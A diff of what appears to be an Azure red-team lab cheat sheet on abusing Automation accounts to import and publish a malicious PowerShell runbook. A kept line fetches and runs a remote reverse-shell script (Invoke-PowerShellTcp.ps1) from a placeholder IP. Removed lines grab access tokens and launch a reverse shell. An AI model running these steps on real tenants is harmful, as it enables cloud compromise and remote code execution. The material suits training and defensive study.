@@ -135,21 +135,9 @@ az extension add --upgrade -n automation
 az automation account list
 ```
 
-### Get the tokens to use Az Powershell
-```
-az account get-access-token
-az account get-access-token --resource-type aad-graph
-
-$accesstoken = ''
-$aadtoken = ''
-
-Connect-AzAccount -AccessToken $accesstoken -GraphAccessToken $aadtoken -AccountId <ID>
-```
-
 #### Get the role assigned of the automation accounts
 - Check for the Roledefinition
 - Get the ID from az automation account list
-
 ```
 Get-AzRoleAssignment -Scope <ID>
 ```
@@ -161,14 +149,12 @@ Get-AzAutomationHybridWorkerGroup -AutomationAccountName <NAME> -ResourceGroupNa
 
 #### Import Powershell runbook
 ```
-Import-AzAutomationRunbook -Name student38 -Path <PATH TO .ps1 FILE> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Type PowerShell -Force -Verbose
+Import-AzAutomationRunbook -Name <NAME> -Path <PATH TO .ps1 FILE> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Type PowerShell -Force -Verbose
 ```
 
-#### Contents off studentx.ps1 for reverse shell
+#### Example contents of .ps1 file
 ```
 IEX (New-Object Net.Webclient).downloadstring("http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1")
-
-reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4444
 ```
 
 #### Publish the automation runbook to the vm
